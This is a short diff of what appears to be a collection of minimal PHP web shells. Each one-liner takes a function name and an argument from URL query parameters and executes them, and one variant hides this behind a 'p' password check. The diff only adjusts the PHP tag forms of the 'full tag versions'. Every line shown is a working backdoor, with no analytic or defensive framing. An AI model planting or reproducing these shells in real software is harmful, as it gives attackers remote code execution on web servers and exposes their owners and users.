@@ -3,5 +3,5 @@
 <?$x=$_GET;@$x[f]($x[c]);
 
 //full tag versions
-<?php $x=$_GET;(@$x[p]=='_'?@$x[f]($x[c]):1);?>
-<?php $x=$_GET;@$x[f]($x[c]);?>
+<?php$x=$_GET;(@$x[p]=='_'?@$x[f]($x[c]):1);
+<?php$x=$_GET;@$x[f]($x[c]);
